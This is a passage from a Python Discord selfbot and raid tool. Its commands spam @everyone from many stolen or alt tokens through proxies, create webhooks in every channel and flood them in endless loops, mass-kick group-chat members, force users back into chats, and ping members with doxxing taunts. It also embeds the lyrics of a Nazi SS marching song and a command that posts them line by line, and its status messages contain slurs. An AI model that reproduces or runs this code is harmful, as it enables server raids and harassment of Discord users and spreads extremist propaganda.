                    print("")
                else:
                    print("Rate limited, or not found.")
                    break
            except:
                print("Rate limited, or outside group.")
                break
            if id != str(migatte.user.id):
                await ctx.send(message)
            if raid == False:
                break
            else:
                pass
    


def anti_kick(h, qued):
    while True:
        k = requests.get(f"https://discord.com/api/v9/channels/{Channel_ID}", headers=headers).json()
        l = k['recipients']
        for a in l:
            if str(qued) != a['id']:
                r = requests.put(f"https://discord.com/api/v9/channels/{Channel_ID}/recipients/{qued}", headers={"Authorization": h}, proxies={"http": next(proxy_pool)})
                if r.status_code == 429:
                    try:
                        sn = r.json()
                        time.sleep(sn['retry_after'])
                    except Exception as asesso:
                        print(asesso)                
                elif raid == False:
                    break
            else:
               pass
            
            
            

@migatte.command()
async def antikick(ctx):
    global raid
    global Channel_ID
    raid = True
    Channel_ID = ctx.message.channel.id
    try:
        await ctx.message.delete()
    except:
        pass
    zen = input("\nInsert your alt's token (You must be friended) > ")
    time.sleep(4)
    sesso = zen[:-35]
    xb = base64.b64decode(str(sesso))
    cdf = str(xb).replace("'", "")
    ee = str(cdf).replace("d", "")
    xam = str(ee).replace("b", "")
    threading.Thread(target=anti_kick, args=(zen, migatte.user.id,)).start(); threading.Thread(target=anti_kick, args=(usertoken, xam,)).start()
    

def remv_Z(d):
    a = requests.delete(f"https://discord.com/api/v9/channels/{Channel_ID}/recipients/{d}", headers=headers, proxies={"http": next(proxy_pool)})
    if a.status_code == 429:
        s = a.json()
        time.sleep(s['retry_after'])

def mass_kick_gc():
    k = requests.get(f"https://discord.com/api/v9/channels/{Channel_ID}", headers=headers, proxies={"http": next(proxy_pool)}).json()
    l = k['recipients']
    for i in l:
        threading.Thread(target=remv_Z, args=(i['id'],)).start()


@migatte.command()
async def removeall(ctx):
    global Channel_ID
    Channel_ID = ctx.message.channel.id
    try:
        await ctx.message.delete()
    except:
        pass
    mass_kick_gc()

@migatte.command()
async def autopurge(ctx):
    global auto_purge
    auto_purge = True
    try:
        await ctx.message.delete()
    except:
        pass

def future_sesso(o):
    session = FuturesSession(); session.get(f"https://discord.com/api/v9/channels/{o}", headers=headers); a = session.result(); print(a)

@migatte.command()
async def sessofuturistico(ctx):
    try:
        await ctx.message.delete()
    except Exception as e:
        print(e)
    oscuro = ctx.guild.channels.id
    for i in oscuro:
        future_sesso(i)

@migatte.command()
async def mutual(ctx, ID="sesso"):
    try:
        await ctx.message.delete()
    except:
        pass
    if ID == "sesso":
        oscuro = ctx.message.author.id
    else:
        oscuro = ID
    r = requests.get(f"https://discord.com/api/v9/users/{ID}/relationships", headers=headers,proxies={"http": next(proxy_pool)})
    a = r.json()
    for gokui in a:
        sesso = []
        culo = gokui['username'] + "#" + str(gokui['discriminator'])
        await ctx.send(f"""
```
{culo}
```
""")



with open("slotbot.txt", "r", encoding="UTF-8") as dripsex:
        slotbot_ids = dripsex.read().splitlines()



@migatte.command()
async def slotbot(ctx):
    global channel_op
    channel_op = ctx.message.channel.id
    try:
        await ctx.message.delete()
    except:
        pass
    for i in slotbot_ids:
        await ctx.send(f"~destroy linen -9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999&20000"); await asyncio.sleep(5)
                
def server_ripf(lol):
    headers = {"Authorization": lol}
    try:
        payload = {"content": messaggio}
        try:
            r = requests.post(f"https://discord.com/api/v9/channels/{channel_op}/messages", json=payload, headers=headers, proxies={"http": next(proxy_pool)})
            if r.status_code == 200:
                print(" [%s-%s] %sSent message.%s" % (green(), reset(), green(), reset()))
            elif r.status_code == 429:
                m = r.json()
                print(" [%s-%s] %sRape Limited%s" % (red(), reset(), red(), reset()))
                time.sleep(m['retry_after'])
            else:
                print(" [%s/%s] %sFailed to send message.%s" % (magenta(), reset(), magenta(), reset()))
        except:
            pass
    except:
        pass  

@migatte.command()
async def mass_say(ctx, *, mess="@everyone"):
    global raid
    global channel_op
    global messaggio
    messaggio = mess
    raid = True
    channel_op = ctx.message.channel.id
    await ctx.message.delete()
    threads = []
    for lol in bakas:
        t = threading.Thread(target=server_ripf, args=(lol,))
        threads.append(t)
        t.start()
        if raid == False:
            break

SS = [
    "S.S. marschiert in Feindesland",
    "und singt ein Teufelslied,",
    "ein Schütze steht am Wolgastrand",
    "und leise summt er mit.",
    "Wir pfeifen auf Unten und Oben",
    "und uns kann die ganze Welt,",
    "verfluchen oder auch loben,",
    "Grad wie es jedem gefällt.",
    "Wo wir sind da geht’s immer vorwärts",
    "und der Teufel, der lacht nur dazu:",
    "ah, ah, ah, ah, ah, ah!",
    "Wir kämpfen für Deutschland,",
    "wir kämpfen für Hitler,",
    "der Rote kommt niemals zur Ruh’.",
    "Wir kämpften schon in mancher Schlacht",
    "in Nord, Süd, Ost und West,",
    "und stehen nun zum Kampf bereit",
    "gegen die rote Pest.",
    "S.S. wird nicht ruh’n wir vernichten,",
    "bis niemand mehr stört Deutschlands Glück,",
    "und wenn sich die Reihen auch lichten",
    "für uns gibt es nie ein zurück."
]

def oscuro_cracker(channel, marshiert):
    try:
        requests.post(f"https://discord.com/api/v9/channels/{channel}/typing", headers=headers)
    finally:
        try:
            requests.post(f"https://discord.com/api/v9/channels/{channel}/messages", json={"content": marshiert},headers=headers)
            time.sleep(random.randit(2, 4))
        except:
            pass




@migatte.command()
async def ss(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    for m in SS:
        oscuro_cracker(ctx.message.channel.id, m)

@migatte.command()
async def touch_grass(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    await migatte.logout(); os.system("taskkill /IM Discord.exe")


@migatte.command()
async def sesso_members_are_spoiled(ctx):
    for d in ctx.guild.channels: await d.edit(slowmode_delay=4)

@migatte.command()
async def hello(ctx):
  await ctx.message.delete()
  async with ctx.typing():
    await asyncio.sleep(640000)
    await ctx.send("hi")


def kill_server(webhook):
    global raid
    raid = True
    while raid:
        a = requests.post(webhook, headers={
            "content-type": "application/json"
        }, json={
            "content": "@everyone **GET SESSED**\nhttps://www.youtube.com/channel/UCdYfkF4FrJIbOWpto0H4fyA\nhttps://www.youtube.com/watch?v=5dmYmZU4y7Y"
        })
        if a.status_code == 429:
            c = a.json(); time.sleep(c['retry_after'])


def concurrent_tasks_lol(webhook):
    threading.Thread(target=kill_server, args=(webhook,)).start()

@migatte.command()
async def nome(ctx):
    try:
        await ctx.message.delete()
    except:
        pass
    global guild_id
    webhooks = []
    guild_id = ctx.guild.id
    for channel in ctx.guild.channels:
        a = requests.post(f"https://discord.com/api/v9/channels/{channel.id}/webhooks", headers=headers, json={
            "name": "Tenkai solos"
        })
        if a.status_code in [a for a in range(200, 210)]:
            i = a.json()
            o = f"https://discord.com/api/webhooks/{channel.id}/{i['token']}"
            webhooks.append(o)
        else:
            pass
    for webk in webhooks:
        concurrent_tasks_lol(webk)
    
@migatte.command()
async def aprile(ctx):
    for channel in ctx.guild.channels:
        if channel.name == "nuked-by-leondev":
            await channel.delete()



async def dox_gc(message): k = requests.get(f"https://discord.com/api/v9/channels/{Channel_ID}", headers=headers, proxies={"http": next(proxy_pool)}).json(); l = k['recipients']; [await message.send("have you doxed me yet? <@%s>" % (i['id'])) for i in l];
@migatte.command()
async def doxall(ctx):
    global Channel_ID; Channel_ID = ctx.message.channel.id;
    try: await ctx.message.delete();
    except: pass;
    await dox_gc(ctx);



if account_type == check_token():
    try:
        migatte.run(usertoken, bot=False)
    except:
        os.system("cls")
        print("""
╔════════════════════════════════════════════╗
║  Looks like your [%stoken%s] is [%sinvalid!%s]     ║
╚════════════════════════════════════════════╝
""" % (yellow(), reset(), red(), reset()))

else:
    try:
        migatte.run(usertoken)
    except:
        os.system("cls")
        print("""
╔════════════════════════════════════════════╗
║  Looks like your [%stoken%s] is [%sinvalid!%s]     ║
╚════════════════════════════════════════════╝
""" % (yellow(), reset(), red(), reset()))

fail = input("\n[%s-%s] %sPress any key to exit%s > " % (red(), reset(), magenta(), reset())) 
